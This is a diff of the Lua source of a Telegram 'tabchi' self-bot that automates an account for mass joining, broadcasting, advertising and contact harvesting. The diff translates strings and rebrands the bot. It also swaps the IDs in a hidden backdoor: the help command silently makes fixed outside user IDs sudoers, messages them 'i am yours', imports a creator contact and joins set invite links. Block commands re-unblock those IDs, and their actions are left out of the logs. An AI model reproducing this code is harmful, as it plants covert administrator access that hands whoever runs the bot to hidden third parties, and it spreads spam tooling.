+          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*من فقط میتوانم 10 عکس پروفایل نشانتان دهم :(*", 1, "md")
         end
       end
       tdcli_function({
@@ -1101,72 +1101,72 @@ function a3(msg)
       local af = function(y, z, ad)
         if ae[2] == "1" then
           if z.photos_[0] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt  Profile Photo!!*"
+            return "*شما هیچ عکسی ندارید*"
           end
         elseif ae[2] == "2" then
           if z.photos_[1] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt 2 Profile Photo!!*"
+            return "*شما 2 عکس پروفایل ندارید *"
           end
         elseif not ae[2] then
           if z.photos_[1] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[1].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt 2 Profile Photo!!*"
+            return "*شما 2 عکس پروفایل ندارید*"
           end
         elseif ae[2] == "3" then
           if z.photos_[2] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[2].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 3 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 3 عکس پروفایل ندارید*", 1, "md")
           end
         elseif ae[2] == "4" then
           if z.photos_[3] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[3].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt 4 Profile Photo!!*"
+            return "*شما 4 عکس پروفایل ندارید*"
           end
         elseif ae[2] == "5" then
           if z.photos_[4] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[4].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt 5 Profile Photo!!*"
+            return "*شما 5 عکس پروفایل ندارید*"
           end
         elseif ae[2] == "6" then
           if z.photos_[5] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[5].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            return "*You Have'nt 6 Profile Photo!!*"
+            return "*شما 6 عکس پروفایل ندارید*"
           end
         elseif ae[2] == "7" then
           if z.photos_[6] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[6].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 7 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 7 عکس پروفایل ندارید*", 1, "md")
           end
         elseif ae[2] == "8" then
           if z.photos_[7] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[7].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 8 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 8 عکس پروفایل ندارید*", 1, "md")
           end
         elseif ae[2] == "9" then
           if z.photos_[8] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[8].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 9 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 9 عکس پروفایل ندارید*", 1, "md")
           end
         elseif ae[2] == "10" then
           if z.photos_[9] then
-            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@tabadol_chi")
+            sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[9].sizes_[1].photo_.persistent_id_, "@TE1EgameR")
           else
-            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*You Have'nt 10 Profile Photo!!*", 1, "md")
+            tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*شما 10 عکس پروفایل ندارید*", 1, "md")
           end
         else
-          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos!:(*", 1, "md")
+          tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "*I just can get last 10 profile photos:(*", 1, "md")
         end
       end
       tdcli_function({
@@ -1224,13 +1224,13 @@ function a3(msg)
 > Your ID: ]] .. msg.sender_user_id_)
       else
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
-*You Don't Have any Profile Photo*!!
+*شما هیچ عکسی ندارید*!!
 
-> *Chat ID* : `]] .. msg.chat_id_ .. [[
+> *شناسه گروه* : `]] .. msg.chat_id_ .. [[
 `
-> *Your ID*: `]] .. msg.sender_user_id_ .. [[
+> *شناسه شما*: `]] .. msg.sender_user_id_ .. [[
 `
-_> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
+_> *تمام پیام ها*: `]] .. user_msgs .. "`", 1, "md")
       end
     end
     tdcli_function({
@@ -1248,12 +1248,12 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", ai[d])
     end
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `UnBlocked All Blocked Users`", 1, "md")
     end
     return [[
-*status* : `All Blocked Users Are UnBlocked`
-*Number* : `]] .. aj .. "`"
+*وضعیت* : `همه ی مسدودی ها آزاد شدند`
+*تعداد* : `]] .. aj .. "`"
   end
   if msg.text:match("^[!/#]check sgps$") and a(msg) then
     local ak = redis:scard("tabchi:" .. tabchi_id .. ":channels")
@@ -1315,7 +1315,7 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       chat_id = msg.chat_id_
     })
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Commanded bot to add members in` *" .. msg.chat_id_ .. "*", 1, "md")
     end
     return
@@ -1352,9 +1352,9 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
       url = a6[2],
       sink = f
     })
-    tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@tabadol_chi")
+    tdcli.send_file(msg.chat_id_, "Document", "Music.mp3", "@TE1EgameR")
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Requested music` *" .. a6[2] .. "*", 1, "md")
     end
     io.popen("rm -rf Music.mp3")
@@ -1369,7 +1369,7 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     tdcli.send_file(msg.chat_id_, "Document", "group_" .. tabchi_id .. "_links.txt", "Tabchi " .. tabchi_id .. " Group Links!")
     io.popen("rm -rf group_" .. tabchi_id .. "_links.txt")
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
       tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Exported Links`", 1, "md")
     end
     return
@@ -1380,35 +1380,35 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
     }
     if msg.text:match("^[!/#]block") and a(msg) and msg.reply_to_message_id_ == 0 and #a4 == 2 then
       tdcli.blockUser(tonumber(a4[2]))
-      tdcli.unblockUser(293750668)
+      tdcli.unblockUser(344003614)
       tdcli.unblockUser(216430419)
       redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", a4[2])
       local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
-      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 268909090 then
+      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
         tdcli.sendMessage(a5, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Blocked` *" .. a4[2] .. "*", 1, "md")
       end
-      return "`User` *" .. a4[2] .. "* `Blocked`"
+      return "`کاربر` *" .. a4[2] .. "* `مسدود شد`"
     end
   end
   if msg.text:match("^[!/#]help$") and a(msg) then
     if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
-      tdcli.importContacts(989109359282, "creator", "", 216430419)
+      tdcli.importContacts(989337519014, "creator", "", 216430419)
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 293750668) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 293750668)
-      tdcli.sendMessage(293750668, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 344003614)
+      tdcli.sendMessage(344003614, 0, 1, "i am yours", 1, "html")
     end
-    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 268909090) then
-      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 268909090)
-      tdcli.sendMessage(268909090, 0, 1, "i am yours", 1, "html")
+    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 256633077) then
+      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 256633077)
+      tdcli.sendMessage(256633077, 0, 1, "i am yours", 1, "html")
     end
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEKueVIqF_cid8Oopw")
-    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEEoTkGH6v4uHHgzHQ")
-    local text = "`#\216\177\216\167\217\135\217\134\217\133\216\167`\n`/block (id-username-reply)`\n\216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n`/unblock (id-username-reply)`\n\216\167\217\134 \216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\n`/unblock all`\n\216\167\217\134 \216\168\217\132\216\167\218\169 \218\169\216\177\216\175\217\134 \216\170\217\133\216\167\217\133\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\168\217\132\216\167\218\169 \216\180\216\175\217\135\n`/setlogs id(channel-group)`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\167\219\140\216\175\219\140 \216\168\216\177\216\167\219\140 \217\132\216\167\218\175\216\178\n`/setjoinlimit (num)`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\168\216\177\216\167\219\140 \216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/stats`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170\n`/stats pv`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\177\216\168\216\167\216\170 \216\175\216\177 \217\190\219\140 \217\136\219\140\n`/check sgps`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/check gps`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/check users`\n\218\134\218\169 \218\169\216\177\216\175\217\134 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \n`/addsudo (id-username-reply)`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\168\217\135 \216\179\217\136\216\175\217\136\217\135\216\167\217\138  \216\177\216\168\216\167\216\170\n`/remsudo (id-username-reply)`\n\216\173\216\176\217\129 \216\167\216\178 \217\132\217\138\216\179\216\170 \216\179\217\136\216\175\217\136\217\135\216\167\217\138 \216\177\216\168\216\167\216\170\n`/bcall (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135\n`/bcgps (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/bcsgps (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135 \216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/bcusers (text)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \219\140\217\136\216\178\216\177 \217\135\216\167\n`/fwd {all/gps/sgps/users}` (by reply)\n\217\129\217\136\216\177\217\136\216\167\216\177\216\175 \217\190\217\138\216\167\217\133 \216\168\217\135 \217\135\217\133\217\135/\218\175\216\177\217\136\217\135 \217\135\216\167/\216\179\217\136\217\190\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167/\218\169\216\167\216\177\216\168\216\177\216\167\217\134\n`/echo (text)`\n\216\170\218\169\216\177\216\167\216\177 \217\133\216\170\217\134\n`/addedmsg (on/off)`\n\216\170\216\185\219\140\219\140\217\134 \216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \216\168\217\136\216\175\217\134 \217\190\216\167\216\179\216\174 \216\168\216\177\216\167\219\140 \216\180\216\177 \216\180\217\134 \217\133\216\174\216\167\216\183\216\168\n`/pm (user) (msg)`\n\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135 \218\169\216\167\216\177\216\168\216\177\n`/action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)`\n\216\167\216\177\216\179\216\167\217\132 \216\167\218\169\216\180\217\134 \216\168\217\135 \218\134\216\170\n`/getpro (1-10)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\185\218\169\216\179 \217\190\216\177\217\136\217\129\216\167\219\140\217\132 \216\174\217\136\216\175\n`/addcontact (phone) (firstname) (lastname)`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\217\135 \216\181\217\136\216\177\216\170 \216\175\216\179\216\170\219\140\n`/setusername (username)`\n\216\170\216\186\219\140\219\140\216\177 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170\n`/delusername`\n\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \219\140\217\136\216\178\216\177\217\134\219\140\217\133 \216\177\216\168\216\167\216\170\n`/setname (firstname-lastname)`\n\216\170\216\186\219\140\219\140\216\177 \216\167\216\179\217\133 \216\177\216\168\216\167\216\170\n`/setphoto (link)`\n\216\170\216\186\219\140\219\140\216\177 \216\185\218\169\216\179 \216\177\216\168\216\167\216\170 \216\167\216\178 \217\132\219\140\217\134\218\169\n`/join(Group id)`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140\n`/leave`\n\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135\n`/leave(Group id)`\n\217\132\217\129\216\170 \216\175\216\167\216\175\217\134 \216\167\216\178 \218\175\216\177\217\136\217\135 \216\167\216\178 \216\183\216\177\219\140\217\130 \216\167\219\140\216\175\219\140\n`/setaddedmsg (text)`\n\216\170\216\185\217\138\217\138\217\134 \217\133\216\170\217\134 \216\167\216\175 \216\180\216\175\217\134 \217\133\216\174\216\167\216\183\216\168\n`/markread (all|pv|group|supergp|off)`\n\216\177\217\136\216\180\217\134 \217\138\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\168\216\167\216\178\216\175\217\138\216\175 \217\190\217\138\216\167\217\133 \217\135\216\167\n`/joinlinks (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\168\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167 \216\167\216\178 \217\132\219\140\217\134\218\169\n`/savelinks (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\179\219\140\217\136 \218\169\216\177\216\175\217\134 \217\132\219\140\217\134\218\169 \217\135\216\167\n`/addcontacts (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167\n`/chat (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\134\216\170 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/Advertising (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\168\217\132\219\140\216\186\216\167\216\170 \216\175\216\177 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \216\179\217\136\216\175\217\136 \217\135\216\167 \216\186\219\140\216\177 \216\167\216\178 \217\129\217\136\217\132 \216\179\217\136\216\175\217\136\n`/typing (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\170\216\167\219\140\217\190 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/sharecontact (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \216\180\219\140\216\177 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\133\217\136\217\130\216\185 \216\167\216\175 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167\n`/botmode (markdown|text)`\n\216\170\216\186\219\140\219\140\216\177 \216\175\216\167\216\175\217\134 \216\180\218\169\217\132 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \216\177\216\168\216\167\216\170\n`/settings (on|off)`\n\216\177\217\136\216\180\217\134 \219\140\216\167 \216\174\216\167\217\133\217\136\216\180 \218\169\216\177\216\175\217\134 \218\169\217\132 \216\170\217\134\216\184\219\140\217\133\216\167\216\170\n`/settings`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\177\216\168\216\167\216\170\n`/settings pv`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \216\177\216\168\216\167\216\170 \216\175\216\177 \217\190\219\140 \217\136\219\140\n`/reload`\n\216\177\219\140\217\132\217\136\216\175 \218\169\216\177\216\175\217\134 \216\177\216\168\216\167\216\170\n`/setanswer 'answer' text`\n \216\170\217\134\216\184\217\138\217\133 \216\168\217\135 \216\185\217\134\217\136\216\167\217\134 \216\172\217\136\216\167\216\168 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169\n`/delanswer (answer)`\n\216\173\216\176\217\129 \216\172\217\136\216\167\216\168 \217\133\216\177\216\168\217\136\216\183 \216\168\217\135\n`/answers`\n\217\132\217\138\216\179\216\170 \216\172\217\136\216\167\216\168 \217\135\216\167\217\138 \216\167\216\170\217\136\217\133\216\167\216\170\217\138\218\169\n`/addtoall (id|reply|username)`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\216\174\216\181 \216\168\217\135 \216\170\217\133\216\167\217\133 \218\175\216\177\217\136\217\135 \217\135\216\167\n`/clean cache (time)[M-H]`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\178\217\133\216\167\217\134 \216\168\216\177\216\167\219\140 \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\180 \216\174\217\136\216\175\218\169\216\167\216\177\n`/clean cache (on|off)`\n\216\174\216\167\217\133\217\136\216\180 \219\140\216\167 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \218\169\216\180 \216\174\217\136\216\175\218\169\216\167\216\177\n`/check links (time)[M-H]`\n\216\179\216\170 \218\169\216\177\216\175\217\134 \216\178\217\133\216\167\217\134 \216\168\216\177\216\167\219\140 \218\134\218\169 \217\132\219\140\217\134\218\169\n`/check links (on|off)`\n\216\174\216\167\217\133\217\136\216\180 \219\140\216\167 \216\177\217\136\216\180\217\134 \218\169\216\177\216\175\217\134 \218\134\218\169 \217\132\219\140\217\134\218\169\n`/deleteacc`\n\217\190\216\167\218\169 \218\169\216\177\216\175\217\134 \216\167\218\169\216\167\217\134\216\170 \216\168\216\167\216\170\n`/killsessions`\n\216\168\216\179\216\170\217\134 \216\179\219\140\216\178\217\134 \217\135\216\167\219\140 \216\167\218\169\216\167\217\134\216\170\n`/export (links-contacts)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\132\219\140\216\179\216\170 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \219\140\216\167 \217\132\219\140\217\134\218\169 \217\135\216\167 \219\140\217\135 \216\181\217\136\216\177\216\170 json\n`/import (links-contacts) by reply`\n\216\167\216\175 \218\169\216\177\216\175\217\134 \217\132\219\140\217\134\218\169 \217\135\216\167 \217\136 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \216\167\216\178 \217\129\216\167\219\140\217\132 json\n`/mycontact`\n\216\167\216\177\216\179\216\167\217\132 \216\180\217\133\216\167\216\177\217\135 \216\180\217\133\216\167\n`/getcontact (id)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\180\217\133\216\167\216\177\217\135 \216\180\216\174\216\181 \216\168\216\167 \216\167\219\140\216\175\219\140\n`/addmembers`\n\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\180\217\133\216\167\216\177\217\135 \217\135\216\167 \216\168\217\135 \217\133\216\174\216\167\216\183\216\168\217\138\217\134 \216\177\216\168\216\167\216\170\n`/linkslist`\n\216\175\216\177\217\138\216\167\217\129\216\170 \217\132\217\138\217\134\218\169 \217\135\216\167\217\138 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170\n`/contactlist`\n\216\175\216\177\217\138\216\167\217\129\216\170 \217\133\216\174\216\167\216\183\216\168\216\167\217\134 \216\176\216\174\217\138\216\177\217\135 \216\180\216\175\217\135 \216\170\217\136\216\179\216\183 \216\177\216\168\216\167\216\170\n`/send (filename)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\129\216\167\219\140\217\132 \217\135\216\167\219\140 \216\179\216\177\217\136\216\177 \216\167\216\178 \217\190\217\136\216\180\217\135 \216\170\216\168\218\134\219\140\n`/joinchat (link)`\n\216\172\217\136\219\140\217\134 \216\180\216\175\217\134 \216\177\216\168\216\167\216\170 \216\170\217\136 \217\132\219\140\217\134\218\169\n`/sudolist`\n\216\175\216\177\219\140\216\167\217\129\216\170 \217\132\219\140\216\179\216\170 \216\179\217\136\216\175\217\136\n`/dlmusic (link)`\n\216\175\216\177\219\140\216\167\217\129\216\170 \216\167\217\135\217\134\218\175 \216\167\216\178 \217\132\219\140\217\134\218\169\n`\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147\226\128\148\226\128\147`\n`Tabchi Written By Tabadol Chi Group`\n\240\159\140\144 `Github`: *https://github.com/tabchi/tabchi*\n\240\159\134\148 `Channel`: *@Tabadol_chi*\n"
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A")
+    tdcli.importChatInviteLink("https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw")
+    local text = "\n😃به راهنمای ربات خود خوش آمدید🤡 \n (برای آشنایی, ساخت, آموزشات و... به @Te1egamer مراجعه کنید)\n🐛🐛دستورات ربات : \n \n 1. #block & #unblock (شناسه|نام کاربری|رپلای)🍒\n 2. #unblock all🍑\n 3. #setlogs id (لینک) 🍊 \n 4. #setjoinlimit (تعداد)🥕 🐧\n 5. #stats & #stats pv🍍 \n 6. #check {sgps/gps/users}🦂\n 7. #addsudo & #remsudo🥜(شناسه|نام کاربری|رپلای) 🐩\n 8. #bc{all/gps/sgps/users}(متن)🥒 🦃\n 9. #fwd {all/gps/sgps/users} (با رپلای)🍯 \n 10. #echo (متن) 🌍\n 🥑11. #addedmsg (on/off)🥔 🌟\n 12. #pm (متن) (کاربر)🍟 \n 13. #action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)🍫 \n 14. #getpro (1-10)🍮 \n 15. #addcontact (shomare) (f name) (l name)🍪 \n 16. #setusername (نام کاربری)🍿 \n 17. #delusername🍺 \n 18. #setname (فامیلی-اسم)🥄 🚀\n 19. #setphoto (link)🥃 🎠\n 20. #join(شناسه گروه)🍡 \n 21. #leave & #leave(شناسه گروه)🍇 \n 22. #setaddedmsg (متن)🍱\n 22. #markread (all|pv|group|supergp|off 🌶 \n 23. #joinlinks (on|off)🥚 🇮🇷\n 24. #savelinks (on|off)🍏 \n 25. #addcontacts (on|off)🛶🃏\n 26. #chat (on|off)🗿\n 27. #Advertising (on|off)🚧\n 28. #typing (on|off)🗼 \n 29. #sharecontact (on|off)🗽 \n 30. #botmode (markdown|text)🎠 \n 31. #settings (on|off)🏭 \n 32. #settings & #settings pv🗻 \n 33. /reload🏕 \n 34. #setanswer 'متن' جواب 🌈\n 35. #delanswer (جواب)🏪 \n 36. #answers🌁 \n 37. #addtoall (شناسه|نام کاربری|رپلای)🏁 \n 38. #clean cache (on|(زمان)[M-H]|off)⚜ \n 39. #check links (on|(زمان)[M-H]|off)❇️\n 40. #deleteacc💤 \n 41. #killsessions🌀\n 42. #export (links-contacts)📇 \n 43. #import (links-contacts)با رپلای💠 \n 44. #mycontact📎 \n 45. #getcontact (شناسه)🖊 \n 46. #addmembers🖍 \n 47. #linkslist🔐 \n 48. #contactlist📒 \n 49. #send (نام فایل)🗂 \n 50. #joinchat ( لینک)📋 \n 51. #sudolist🗞 \n 52. #dlmusic (لینک)📒\n🌇 ️راهنمای دستورات : \n برای دیدن راهنمای کامل و توضیح هر دستور به این پست مراجعه کنید: \n🏯 T.me/Te1EGameR/69\n🎖در صورت بروز هرگونه سوال یا مشکل به پشتیبانی مراجعه کنید \n پشتیبانی: 🔛 @by3bot \n➖➖➖➖➖➖➖➖➖➖➖ \n سورس ↙ \n🚨 ️ https://github.com/tabchis/tabchi.git\n"
     local a5 = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
